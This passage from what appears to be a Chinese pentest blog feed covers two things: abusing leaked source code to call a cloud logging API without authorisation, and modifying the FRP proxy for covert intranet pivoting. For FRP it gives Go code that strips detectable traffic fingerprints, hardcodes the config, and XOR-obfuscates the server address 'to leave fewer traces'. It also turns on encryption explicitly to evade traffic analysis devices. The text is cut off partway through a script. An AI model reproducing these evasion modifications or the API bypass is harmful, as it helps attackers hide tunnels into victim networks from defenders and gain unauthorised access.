......</span></span><br></pre></td></tr></table></div></figure><ul><li>这里主要调用<code>get_signature()</code>函数完成鉴权，而下面的<code>auth.set_params(test.get_params(&quot;xxx&quot;))</code>则指定要执行的<code>Action</code>，对应右侧<code>data/base.json</code>文件中的字典名。如这里输入<code>index_list</code>即表明调用<code>Action=ListLogIndex</code></li></ul><p><a data-fancybox="gallery" data-src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-0.png" data-caption="Github源码泄漏导致权限绕过-0"><img src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-0.png" alt="Github源码泄漏导致权限绕过-0"></a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>开启BurpSuite，监听<code>8080</code>端口</li><li>打开<code>utils/operation_send.py</code>文件，修改下面代码：</li></ul><figure class="highlight python"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-l2z9y7lr592jbb"></i><span>  Python  </span><div class="collapse show" id="collapse-l2z9y7lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from utils.operation_json import OperationJsonUtil</span></span><br><span class="line"><span class="keyword">from</span> operation_json <span class="keyword">import</span> OperationJsonUtil</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><ul><li>然后添加2行代码，把流量转发到 BurpSuite</li></ul><p><a data-fancybox="gallery" data-src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-1.png" data-caption="Github源码泄漏导致权限绕过-1"><img src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-1.png" alt="Github源码泄漏导致权限绕过-1"></a></p><ul><li>运行该脚本，可以在BurpSuite看到响应：</li></ul><p><a data-fancybox="gallery" data-src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-2.png" data-caption="Github源码泄漏导致权限绕过-2"><img src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-2.png" alt="Github源码泄漏导致权限绕过-2"></a></p><ul><li>将<code>main</code>函数中下面这行修改为<code>project_list</code>，即可调用<code>ListLogProject</code>这个功能</li></ul><figure class="highlight python"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-15i0xrlr592jbb"></i><span>  Python  </span><div class="collapse show" id="collapse-15i0xrlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># auth.set_params(test.get_params(&quot;index_list&quot;))</span></span><br><span class="line">auth.set_params(test.get_params(<span class="string">&quot;project_list&quot;</span>))</span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-3.png" data-caption="Github源码泄漏导致权限绕过-3"><img src="/assets/Github%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-3.png" alt="Github源码泄漏导致权限绕过-3"></a></p><ul><li>还有<code>CreateLogIndex/DeleteLogIndex/CreateProject/DeleteLogProject</code>等可增加或删除的功能（参考<code>data/base.json</code>文件），利用方式相同，但具有一定风险，因此没有进行测试。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Trick </tag>
            
            <tag> 实战案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FRP魔改</title>
      <link href="/posts/FRP%E9%AD%94%E6%94%B9.html"/>
      <url>/posts/FRP%E9%AD%94%E6%94%B9.html</url>
      
        <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/M1r0ku/frp-Modify">https://github.com/M1r0ku/frp-Modify</a></p><p>Todo：</p><ul><li><p><input checked="" disabled="" type="checkbox"> 去除非 TLS 流量特征</p><ul><li><code>frp/pkg/msg/msg.go</code></li></ul></li><li><p><input checked="" disabled="" type="checkbox"> 配置文件写入源码</p><ul><li><code>frp/cmd/frpc/sub/root.go</code></li></ul></li><li><p><input checked="" disabled="" type="checkbox"> 通过参数传入 IP 端口，且参数异或加密，便于隐藏</p><ul><li><code>frp/cmd/frpc/sub/root.go</code></li></ul></li><li><p><input checked="" disabled="" type="checkbox"> 钉钉上线提醒</p><ul><li><code>frp/client/control.go</code></li></ul></li><li><p><input checked="" disabled="" type="checkbox"> 域前置：通过 websocket 协议让 FRP 上域前置</p><ul><li><code>go/pkg/mod/golang.org/x/net@v0.0.0-20210428140749-89ef3d95e781/websocket/client.go</code></li><li><code>go/pkg/mod/golang.org/x/net@v0.0.0-20210428140749-89ef3d95e781/websocket/hybi.go</code></li><li><code>pkg/util/net/websocket.go</code></li></ul></li><li><p>文中相关流量包：<a href="/assets/frp-wireshark.zip">frp-wireshark.zip</a></p></li></ul><h2 id="基本运行"><a href="#基本运行" class="headerlink" title="基本运行"></a>基本运行</h2><ul><li><p>启动</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-2zgo7elr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-2zgo7elr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FrpServer</span></span><br><span class="line">$ ./frps -c frps.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-n1h4e0lr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-n1h4e0lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># FrpClient</span></span><br><span class="line">$ ./frpc -c frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.111.1</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 7788</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li><li><p>编译，运行<code>package.sh</code>即可交叉编译并打包各系统可执行文件</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-hhld1wlr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-hhld1wlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./package.sh</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li><li><p>环境：这里用 Docker 起了个漏洞环境来模拟内网，IP为<code>172.18.0.2</code>，实体机是无法访问的</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-tt5ooblr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-tt5ooblr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看容器IP地址</span></span><br><span class="line">$ docker inspect &lt;容器ID&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-0.png" data-caption="FRP魔改-0"><img src="/assets/FRP%E9%AD%94%E6%94%B9-0.png" alt="FRP魔改-0"></a></p></li><li><p>Proxy 配置：IP 为<code>frpc.ini</code>中的<code>server_addr</code>，Port 为<code>frpc.ini</code>中的<code>remote_port</code></p></li></ul><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-1.png" data-caption="FRP魔改-1"><img src="/assets/FRP%E9%AD%94%E6%94%B9-1.png" alt="FRP魔改-1"></a></p><h2 id="非TLS流量特征"><a href="#非TLS流量特征" class="headerlink" title="非TLS流量特征"></a>非TLS流量特征</h2><p>没有启用 TLS 时，frpc 在连接认证 frps 的时候会把 FRP 版本等信息发给 frps 进行认证。通过追踪 TCP 流量可以看到这些信息，目前一些流量设备就通过这个特征来识别 FRP 代理<br>可以看到有如下几个字段值：<code>version, os, arch, privilege_key, pool_count, run_id</code></p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-2.png" data-caption="FRP魔改-2"><img src="/assets/FRP%E9%AD%94%E6%94%B9-2.png" alt="FRP魔改-2"></a></p><p>去除的方法就是修改这些特征值即可，定位到<code>frp/pkg/msg/msg.go</code>文件</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-3.png" data-caption="FRP魔改-3"><img src="/assets/FRP%E9%AD%94%E6%94%B9-3.png" alt="FRP魔改-3"></a></p><p>修改这些结构体的字段，如下：</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-j3vfbclr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-j3vfbclr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Login <span class="keyword">struct</span> &#123;</span><br><span class="line">Version      <span class="type">string</span>            <span class="string">`json:&quot;V&quot;`</span></span><br><span class="line">Hostname     <span class="type">string</span>            <span class="string">`json:&quot;H&quot;`</span></span><br><span class="line">Os           <span class="type">string</span>            <span class="string">`json:&quot;O&quot;`</span></span><br><span class="line">Arch         <span class="type">string</span>            <span class="string">`json:&quot;A&quot;`</span></span><br><span class="line">User         <span class="type">string</span>            <span class="string">`json:&quot;U&quot;`</span></span><br><span class="line">PrivilegeKey <span class="type">string</span>            <span class="string">`json:&quot;PK&quot;`</span></span><br><span class="line">Timestamp    <span class="type">int64</span>             <span class="string">`json:&quot;T&quot;`</span></span><br><span class="line">RunID        <span class="type">string</span>            <span class="string">`json:&quot;RID&quot;`</span></span><br><span class="line">Metas        <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;M&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Some global configures.</span></span><br><span class="line">PoolCount <span class="type">int</span> <span class="string">`json:&quot;PC&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> LoginResp <span class="keyword">struct</span> &#123;</span><br><span class="line">Version       <span class="type">string</span> <span class="string">`json:&quot;V&quot;`</span></span><br><span class="line">RunID         <span class="type">string</span> <span class="string">`json:&quot;RID&quot;`</span></span><br><span class="line">ServerUDPPort <span class="type">int</span>    <span class="string">`json:&quot;SUP&quot;`</span></span><br><span class="line">Error         <span class="type">string</span> <span class="string">`json:&quot;E&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>这里发现下面还有一个<code>run_id</code>，这个是在<code>NewWorkConn</code>结构体中的，修改方法同样</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-4.png" data-caption="FRP魔改-4"><img src="/assets/FRP%E9%AD%94%E6%94%B9-4.png" alt="FRP魔改-4"></a></p><p>然后配置代理进行测试，可以正常连接</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-5.png" data-caption="FRP魔改-5"><img src="/assets/FRP%E9%AD%94%E6%94%B9-5.png" alt="FRP魔改-5"></a></p><p>在<code>frp/client/service.go</code>文件中可以看到这里的<code>loginMsg</code>调用了前面那些变量</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-6.png" data-caption="FRP魔改-6"><img src="/assets/FRP%E9%AD%94%E6%94%B9-6.png" alt="FRP魔改-6"></a></p><p>如果想要进一步修改，可以跟进并修改变量的值。如跟进<code>version.Full()</code>，可以直接修改<code>version</code>变量</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-7.png" data-caption="FRP魔改-7"><img src="/assets/FRP%E9%AD%94%E6%94%B9-7.png" alt="FRP魔改-7"></a></p><h2 id="启用TLS及加密压缩"><a href="#启用TLS及加密压缩" class="headerlink" title="启用TLS及加密压缩"></a>启用TLS及加密压缩</h2><p>从<code>v0.25.0</code>版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输，安全性更高。</p><figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-xhexqflr592jbb"></i><span>  Bash  </span><div class="collapse show" id="collapse-xhexqflr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.111.1</span><br><span class="line">server_port = 7000</span><br><span class="line"><span class="comment"># 启用TLS</span></span><br><span class="line">tls_enable = <span class="literal">true</span> </span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 7788</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-8.png" data-caption="FRP魔改-8"><img src="/assets/FRP%E9%AD%94%E6%94%B9-8.png" alt="FRP魔改-8"></a></p><p>另外还可以启用加密和压缩，将通信内容加密传输，将会有效防止流量被拦截。</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-j95rdylr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-j95rdylr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = <span class="number">192.168</span><span class="number">.111</span><span class="number">.1</span></span><br><span class="line">server_port = <span class="number">7000</span></span><br><span class="line"># 启用TLS</span><br><span class="line">tls_enable = <span class="literal">true</span> </span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line"><span class="keyword">type</span> = tcp</span><br><span class="line">remote_port = <span class="number">7788</span></span><br><span class="line">plugin = socks5</span><br><span class="line"># 启用加密和压缩,躲避流量分析设备</span><br><span class="line">use_encryption = <span class="literal">true</span> </span><br><span class="line">use_compression = <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="配置文件写入源码"><a href="#配置文件写入源码" class="headerlink" title="配置文件写入源码"></a>配置文件写入源码</h2><blockquote><p>将配置文件写入源码，且通过参数传递 IP </p></blockquote><p>直接在<code>frp/cmd/frpc/sub/root.go</code>文件中添加一个函数</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-upjvyqlr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-upjvyqlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义全局变量</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">fileContent <span class="type">string</span></span><br><span class="line">ip          <span class="type">string</span></span><br><span class="line">port        <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写 getFileContent 函数接收参数，并定义配置信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ip <span class="type">string</span>, port <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> configContent <span class="type">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">tls_enable = true </span></span><br><span class="line"><span class="string">[plugin_socks]</span></span><br><span class="line"><span class="string">type = tcp</span></span><br><span class="line"><span class="string">remote_port = 7788</span></span><br><span class="line"><span class="string">plugin = socks5</span></span><br><span class="line"><span class="string">#plugin_user = &lt;User&gt;</span></span><br><span class="line"><span class="string">#plugin_passwd = &lt;Pwd&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line">fileContent = configContent</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>然后在<code>init</code>函数中定义传参</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-j1d2dqlr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-j1d2dqlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;./frpc.ini&quot;</span>, <span class="string">&quot;config file of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;cfgDir, <span class="string">&quot;config_dir&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;config directory, run one frpc service for each file in config directory&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, <span class="string">&quot;version&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;version of frpc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义接收 IP 和 Port 参数</span></span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;ip, <span class="string">&quot;server_addr&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_addr&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;port, <span class="string">&quot;server_port&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_port&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>另外还要修改<code>runClient()</code>函数，但这里参考文章中的<code>parseClientCommonCfg()</code>函数在新版本已经删除，所以需要寻找其它函数</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-9.png" data-caption="FRP魔改-9"><img src="/assets/FRP%E9%AD%94%E6%94%B9-9.png" alt="FRP魔改-9"></a></p><p>其实这一步的主要的作用的将前面自定义的配置信息进行解析，这里跟进原版<code>runClient()</code>函数中的<code>config.ParseClientConfig()</code>函数</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-10.png" data-caption="FRP魔改-10"><img src="/assets/FRP%E9%AD%94%E6%94%B9-10.png" alt="FRP魔改-10"></a></p><p>跳转到<code>frp/pkg/config/parse.go</code>文件中，这里发现存在<code>UnmarshalClientConfFromIni()</code>函数来解析<code>content</code>配置信息，且该变量为<code>[]byte</code>类型</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-11.png" data-caption="FRP魔改-11"><img src="/assets/FRP%E9%AD%94%E6%94%B9-11.png" alt="FRP魔改-11"></a></p><p>Go 语言不支持重载，所以这里自定义一个<code>runClient2()</code>函数，接收<code>ip,port</code>两个参数，然后通过前面定义的<code>getFileContent()</code>函数获取<code>fileContent</code>，并转换为<code>[]byte</code>类型的<code>content</code>，然后套用<code>config.ParseClientConfig()</code>函数中前面图中的两部分</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-mm9ku1lr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-mm9ku1lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义函数进行处理</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runClient2</span><span class="params">(cfgFilePath <span class="type">string</span>, ip <span class="type">string</span>, port <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">getFileContent(ip, port)</span><br><span class="line">content := []<span class="type">byte</span>(fileContent)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse common section.</span></span><br><span class="line">cfg, err := config.UnmarshalClientConfFromIni(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">cfg.Complete()</span><br><span class="line"><span class="keyword">if</span> err = cfg.Validate(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">err = fmt.Errorf(<span class="string">&quot;parse config error: %v&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse all proxy and visitor configs.</span></span><br><span class="line">pxyCfgs, visitorCfgs, err := config.LoadAllProxyConfsFromIni(cfg.User, content, cfg.Start)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>最终在图中下面调用<code>runClient()</code>函数的地方修改为<code>runClient2()</code>，上面的是为一个配置目录内每个配置文件都起一个 frpc，因此不需要修改</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-12.png" data-caption="FRP魔改-12"><img src="/assets/FRP%E9%AD%94%E6%94%B9-12.png" alt="FRP魔改-12"></a></p><p>经测试可以正常使用</p><p><a data-fancybox="gallery" data-src="/assets/FRP%E9%AD%94%E6%94%B9-13.png" data-caption="FRP魔改-13"><img src="/assets/FRP%E9%AD%94%E6%94%B9-13.png" alt="FRP魔改-13"></a></p><h2 id="传参加密混淆"><a href="#传参加密混淆" class="headerlink" title="传参加密混淆"></a>传参加密混淆</h2><blockquote><p>前面直接传递 IP、Port 等参数容易留下痕迹，因此可以对传递的参数进行加密混淆，并在源码中进行解密</p></blockquote><p>前面是通过<code>frp/cmd/frpc/sub/root.go</code>文件中的<code>getFileContent()</code>函数来接收 IP、Port 并拼接到配置信息的，所以可以在这个函数中进行解密操作。<br>这里实现一个异或函数，并在接收到参数后进行调用</p><figure class="highlight go"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-z8g9pdlr592jbb"></i><span>  Go  </span><div class="collapse show" id="collapse-z8g9pdlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现异或函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">str2xor</span><span class="params">(message <span class="type">string</span>, keywords <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">result := <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(message); i++ &#123;</span><br><span class="line">result += <span class="type">string</span>(message[i] ^ keywords[i%<span class="built_in">len</span>(keywords)])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写 getFileContent 函数接收参数，并定义配置信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ip <span class="type">string</span>, port <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// 接收到参数后调用异或函数</span></span><br><span class="line">key := <span class="string">&quot;testkey&quot;</span></span><br><span class="line">ip = str2xor(ip, key)</span><br><span class="line">port = str2xor(port, key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> configContent <span class="type">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">tls_enable = true </span></span><br><span class="line"><span class="string">[plugin_socks]</span></span><br><span class="line"><span class="string">type = tcp</span></span><br><span class="line"><span class="string">remote_port = 7788</span></span><br><span class="line"><span class="string">plugin = socks5</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">fileContent = configContent</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>附带一个简单的异或小脚本</p><figure class="highlight python"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-h10bohlr592jbb"></i><span>  Python  </span><div class="collapse show" id="collapse-h10bohlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">str2xor</span>(<span class="params">messages, key</span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> index, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(messages):</span><br><span class="line">        res += <span class="built_in">chr</span>( <span class="built_in">ord</span>(msg) ^ <span class="built_in">ord</span>(key[index % <span class="built_in">len</span>(key)]) )</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.111.1&quot;</span>   <span class="comment"># E\AZZSAZTBEET</span></span><br><span class="line">  